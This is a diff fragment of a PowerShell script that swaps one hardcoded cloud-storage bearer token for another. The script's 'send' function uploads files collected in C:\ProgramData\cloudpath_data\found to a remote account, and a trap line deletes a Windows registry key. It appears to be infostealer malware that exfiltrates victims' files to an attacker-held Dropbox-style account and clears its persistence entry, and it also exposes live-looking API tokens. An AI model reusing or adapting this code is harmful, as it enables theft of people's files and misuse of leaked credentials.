@@ -3,7 +3,7 @@ trap{C:\Windows\System32\reg.exe delete HKEY_CURRENT_USER\Software\Microsoft\Win
 function send($f) {
     $TargetFilePath = "/c/$f"
     $SourceFilePath = "C:\ProgramData\cloudpath_data\found\$f"
-    $token = "sl.BvPWaokhcsJFpGQa96A0fQYLmpadjqfVLXwE8hPZO6tZzg1h_Df-EAY3uEuSoTjMsRlEU7yIOok-hy_mvE3HHhVU0TWXn56W9hrSTixN9boU2VFuQznGFMUL411B7LoB7HKspuS2_NqE"
+    $token = "sl.BvPzAJGLlHUCJioU7GflsH26yulmJRHh9YzqU9d4baMoBFJnAo1rJcrrtPzYpei8LOSQXOiwXf4PBAP0rThKoMBYJjKk8sK209BUNy150MKMFVX3hQeAo3rNV3_Rzy1DimXwm_DL-kiZ"
     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
     $authorization = "Bearer " + $token
     $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
